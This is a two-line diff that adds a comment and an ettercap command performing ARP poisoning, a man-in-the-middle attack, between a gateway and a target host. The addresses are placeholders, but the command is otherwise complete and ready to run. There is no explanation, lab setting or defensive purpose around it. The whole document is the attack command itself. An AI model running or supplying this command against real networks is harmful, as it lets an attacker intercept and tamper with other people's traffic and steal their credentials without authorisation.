@@ -1,0 +1,2 @@
+#poison gateway and Target IP
+ettercap -T -q -M ARP /GA.TE.WA.Y/ /TA.R.G.ET/
